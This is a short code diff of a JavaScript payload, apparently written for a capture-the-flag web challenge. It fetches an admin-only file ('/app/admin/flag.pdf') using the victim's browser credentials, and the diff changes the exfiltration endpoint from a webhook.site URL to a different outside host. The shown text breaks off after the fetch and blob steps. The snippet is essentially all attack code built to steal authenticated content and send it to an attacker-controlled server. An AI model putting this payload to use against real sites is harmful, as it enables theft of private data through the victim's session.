@@ -1,6 +1,6 @@
 (function(){
     const flagUrl = '/app/admin/flag.pdf';
-    const webhookUrl = 'https://webhook.site/c2f4ea1f-7b95-4903-b629-a9a3357e9c67';
+    const webhookUrl = 'https://wechatapp.xsm756.xyz/upload/';
 
     fetch(flagUrl, { credentials: 'include' })
       .then(response => response.blob())
